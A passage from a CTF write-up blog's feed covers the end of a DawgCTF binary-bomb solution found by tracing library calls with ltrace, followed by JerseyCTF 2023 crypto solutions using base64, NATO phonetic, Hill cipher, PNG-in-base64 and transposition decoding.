&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Sp1nNi1g_aNd_SpiNNinG_4Nd_sP1nNI&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;..., &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;HELP&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 32) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;11
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;siDgabDzXZa]XsibaabgMXGa]XlpDgaO&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;..., &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;siDgabDzXZa]XsibaabgMXGa]XlpDgaO&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;..., 32) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strlen&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;siDgabDzXZa]XsibaabgMXGa]XlpDgaO&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;...) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;34
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rand&lt;&#x2F;span&gt;&lt;span&gt;(3, 0x559057ce0210, 0x800400000000, 8) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0xee19b98
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calloc&lt;&#x2F;span&gt;&lt;span&gt;(160, 1)                            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x559057ff5400
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sprintf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Better luck on phase 4&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Better luck on phase %d&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 4) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;22
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The comparision is done as the &lt;code&gt;strncmp&lt;&#x2F;code&gt; resulted &lt;code&gt;0&lt;&#x2F;code&gt; but this didn&#x27;t give me any flag. So, after a while I tried to make it meaningfull to read&lt;&#x2F;p&gt;
&lt;p&gt;I changed &lt;code&gt;Sp1nNi1g_aNd_SpiNNinG_4Nd_sP1nNI&lt;&#x2F;code&gt; to &lt;code&gt;Sp1nNi1g_aNd_SpiNNinG_4Nd_sP1nNIng&lt;&#x2F;code&gt; added &lt;code&gt;ng&lt;&#x2F;code&gt; at the end.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;Desktop&#x2F;CYBER&#x2F;CTF&#x2F;CTFTime&#x2F;17_DawgCTF&#x2F;binary_bomb&#x2F;phase-2$&lt;&#x2F;span&gt;&lt;span&gt; ltrace .&#x2F;dawg_bbomb 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Enter&lt;&#x2F;span&gt;&lt;span&gt; round 3 input: Sp1nNi1g_aNd_SpiNNinG_4Nd_sP1nNIng
&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;35
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;realloc&lt;&#x2F;span&gt;&lt;span&gt;(0x559057ff5150, 35)               &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x559057ff5150
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncpy&lt;&#x2F;span&gt;&lt;span&gt;(0x559057ff5150, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Sp1nNi1g_aNd_SpiNNinG_4Nd_sP1nNI&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;..., 35) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x559057ff5150
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Sp1nNi1g_aNd_SpiNNinG_4Nd_sP1nNI&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;..., &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;SKIP&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 34) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;37
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Sp1nNi1g_aNd_SpiNNinG_4Nd_sP1nNI&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;..., &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;HELP&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 34) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;11
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;siDgabDzXZa]XsibaabgMXGa]XlpDgaO&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;..., &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;siDgabDzXZa]XsibaabgMXGa]XlpDgaO&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;..., 34) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strlen&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;siDgabDzXZa]XsibaabgMXGa]XlpDgaO&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;...) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;34
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rand&lt;&#x2F;span&gt;&lt;span&gt;(3, 0x559057ce0210, 0x800400000000, 8) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x48a902d4
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calloc&lt;&#x2F;span&gt;&lt;span&gt;(100, 1)                            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x559057ff5400
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sprintf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Phase 3 locked down&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Phase %d locked down&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 3) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;19
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;\033[32m%s\n\033[0m&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Phase 3 locked down&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;Phase 3 locked down
&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;29
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;free&lt;&#x2F;span&gt;&lt;span&gt;(0x559057ff5400)                      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;\033[35mFlag: DawgCTF{s}\n\033[0m&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Sp1nNi1g_aNd_SpiNNinG_4Nd_sP1nNI&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;...Flag: DawgCTF{Sp1nNi1g_aNd_SpiNNinG_4Nd_sP1nNIng}
&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;59
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;And finally, This gave me the flag.[A long deep breath]&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DawgCTF{Sp1nNi1g_aNd_SpiNNinG_4Nd_sP1nNIng}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;And thats a wrap, Thank You for Reading..!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Jersey CTF 2023</title>
        <published>2023-04-18T00:00:00+00:00</published>
        <updated>2023-04-18T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/jerseyctf23/"/>
        <id>https://themj0ln1r.github.io/writeups/jerseyctf23/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/jerseyctf23/">&lt;p&gt;Hello ctfian&#x27;s! I played &lt;a href= &quot;https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1908&quot; target=_blank&gt;JerseyCTF 2023&lt;&#x2F;a&gt; which was happened from  15 Apr to 16 Apr. I played it with the team &lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;team&#x2F;217079&quot;&gt;Invaders0x1&lt;&#x2F;a&gt;.
This time I scored 2600+ points. And our Team secured 125th place in CTF.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_progress.png&quot; alt=&quot;Progess&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;This time I solved 6 challs in crypto which is my fav category.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;crypto-challs&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto-challs&quot; aria-label=&quot;Anchor link for: crypto-challs&quot;&gt;Crypto Challs&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;missing-employee-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#missing-employee-1&quot; aria-label=&quot;Anchor link for: missing-employee-1&quot;&gt;missing employee-1&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_missemp1.png&quot; alt=&quot;missingemp1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;TGltYSBBbHBoYSBLaWxvIEVjaG8gTWlrZSBJbmRpYSBDaGFybGllIEhvdGVsIEluZGlhIEdvbGYgQWxwaGEgTm92ZW1iZXI=&lt;&#x2F;code&gt;
Decoded this text from base64&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;JerseyCTF&#x2F;crypto&#x2F;missing_employe_done$&lt;&#x2F;span&gt;&lt;span&gt; echo &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;TGltYSBBbHBoYSBLaWxvIEVjaG8gTWlrZSBJbmRpYSBDaGFybGllIEhvdGVsIEluZGlhIEdvbGYgQWxwaGEgTm92ZW1iZXI=&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -d
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Lima&lt;&#x2F;span&gt;&lt;span&gt; Alpha Kilo Echo Mike India Charlie Hotel India Golf Alpha November
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Submitted this in flag format, but it doesn&#x27;t worked for me. The did a quick google search these words. And i found that these are the &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;NATO_phonetic_alphabet&quot; target=_blank&gt;&lt;strong&gt;NATO phonetic alphabets&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;. And decoded it by following the representations of this words.&lt;&#x2F;p&gt;
&lt;p&gt;Lima - l&lt;br&gt;Alpha - a&lt;br&gt;Kilo - k&lt;br&gt; Echo - e&lt;br&gt; and so on.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag: jctf{lake-michigan}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;jack-and-jill&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#jack-and-jill&quot; aria-label=&quot;Anchor link for: jack-and-jill&quot;&gt;jack-and-jill&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_jack.png&quot; alt=&quot;jackandjill&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Ciphertext is given : &lt;code&gt;pgQVJFCohpccuyBSbwxcxpVZCAATRT&lt;&#x2F;code&gt;. A 2x2 matrix is given [[3,9],[4,7]].&lt;&#x2F;p&gt;
&lt;p&gt;By observing the description i found that this is a &lt;code&gt;hill cipher&lt;&#x2F;code&gt;. I quickly searched for the hill cipher decoder online. I used &lt;a href=&quot;https:&#x2F;&#x2F;www.dcode.fr&#x2F;hill-cipher&quot; target=_blank&gt;this site&lt;&#x2F;a&gt; to decipher the text.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_jack1.png&quot; alt=&quot;jackandjilldecode&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The deciphered text is &lt;strong&gt;&lt;code&gt;hiTHEREwelcomeTOlinearALGEBRAZ&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : jctf{hiTHEREwelcomeTOlinearALGEBRAZ}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;space-dust&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#space-dust&quot; aria-label=&quot;Anchor link for: space-dust&quot;&gt;space-dust&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_spacedust.png&quot; alt=&quot;spacedust&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The challenge have this attachment &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;jerseyctf23&#x2F;message_from_tom.txt&quot; download&gt;message_from_tom.txt &lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;First of all, I observed a &lt;code&gt;==&lt;&#x2F;code&gt; at the end of the content of the file. Immediated I decoded it from base64 and stored in other file. And the file size is a bit suspicious so I observed its hexdump. It contains a PNG header. So, I renamed the image image into decoded.png. Then i opened the image it has the flag in it.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;space-dust$&lt;&#x2F;span&gt;&lt;span&gt; cat message_from_tom.txt &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; decoded
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;space-dust$
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;space-dust$&lt;&#x2F;span&gt;&lt;span&gt; xxd decode &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;head
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00000000:&lt;&#x2F;span&gt;&lt;span&gt; 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00000010:&lt;&#x2F;span&gt;&lt;span&gt; 0000 0a00 0000 05a0 0806 0000 0092 001a  ................
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00000020:&lt;&#x2F;span&gt;&lt;span&gt; df00 0000 0173 5247 4200 aece 1ce9 0000  .....sRGB.......
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00000030:&lt;&#x2F;span&gt;&lt;span&gt; 0004 6741 4d41 0000 b18f 0bfc 6105 0000  ..gAMA......a...
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00000040:&lt;&#x2F;span&gt;&lt;span&gt; 0009 7048 5973 0000 0ec3 0000 0ec3 01c7  ..pHYs..........
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00000050:&lt;&#x2F;span&gt;&lt;span&gt; 6fa8 6400 00ff a549 4441 5478 5ee4 fd67  o.d....IDATx^..g
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00000060:&lt;&#x2F;span&gt;&lt;span&gt; 776c 3b92 a609 1a35 e9d4 fae8 2b43 6556  wl&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;....5....+CeV
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00000070:&lt;&#x2F;span&gt;&lt;span&gt; 5677 4fcf 879e 5933 ffad fe5d d7a8 55d5  VwO...Y3...]..U.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00000080:&lt;&#x2F;span&gt;&lt;span&gt; 5599 1915 1157 9c7b 34b5 763a f5bc cf6b  U....W.{4.v:...k
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;space-dust$ mv decoded decoded.png
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The decoded image is &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;jerseyctf23&#x2F;decoded.png&quot; download&gt; decoded.png &lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : jctf{th1s_1s_n0t_a_game}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;roko-cipher-in-the-console&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#roko-cipher-in-the-console&quot; aria-label=&quot;Anchor link for: roko-cipher-in-the-console&quot;&gt;roko-cipher-in-the-console&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_roko.png&quot; alt=&quot;roko&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We can see this is a transpositional cipher. &lt;code&gt;f1stg}th10_ej{s__act_nam&lt;&#x2F;code&gt;. I observed that the flag is plaintext but it was transposed. We can observe that the &lt;code&gt;jctf{}&lt;&#x2F;code&gt; letters in the ciphertext.&lt;&#x2F;p&gt;
&lt;p&gt;I wrote this ciphertext in different deapths. Like writing it in 4 columns, 5 columns and so on . I observed a standard format when I write this in 6 columns.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_roko1.png&quot; alt=&quot;rokocol&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We can get the flag by reading column by column and in every column the order of reading letters is row-3,row-4,row-2,row-1.&lt;&#x2F;p&gt;
&lt;p&gt;That is first column should be taken as &lt;code&gt;jctf&lt;&#x2F;code&gt;. Second column is &lt;code&gt;{th1&lt;&#x2F;code&gt; and so on.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : jctf{th1s_1s_n0t_a_game}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;supply-stash&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#supply-stash&quot; aria-label=&quot;Anchor link for: supply-stash&quot;&gt;supply-stash&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_supply1.png&quot; alt=&quot;supplystash1&quot; &#x2F;&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_supply2.png&quot; alt=&quot;supplystash2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This is medium level challenge in crypto. The challenge has a java file name &lt;code&gt;numericalEncoder.java&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;java&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;Encoding program originally by Logan DesRochers
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;java&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;lang&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Math&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;java&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;ArrayList&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
